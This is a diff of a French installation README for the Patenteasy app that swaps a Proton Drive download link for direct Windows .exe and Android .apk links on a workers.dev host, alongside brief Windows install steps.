@@ -2,7 +2,7 @@
 
 ## Installer l’application
 
-[Ouvrir les téléchargements officiels](https://drive.proton.me/urls/ZD87JFPW44#kdecNnhPndLG).
+**[Télécharger Windows 0.4.4](https://patenteasy-updates.sav-centreprotech.workers.dev/fichiers/Patenteasy-Windows-0.4.4-Installation.exe)** · **[Télécharger Android 0.4.4](https://patenteasy-updates.sav-centreprotech.workers.dev/fichiers/Patenteasy-Android-0.4.4.apk)**
 
 **Sur Windows :** téléchargez le fichier d’installation `.exe`, ouvrez-le et suivez les étapes. Lancez ensuite Patenteasy depuis son raccourci. Vous n’avez aucun environnement de programmation à installer.
 
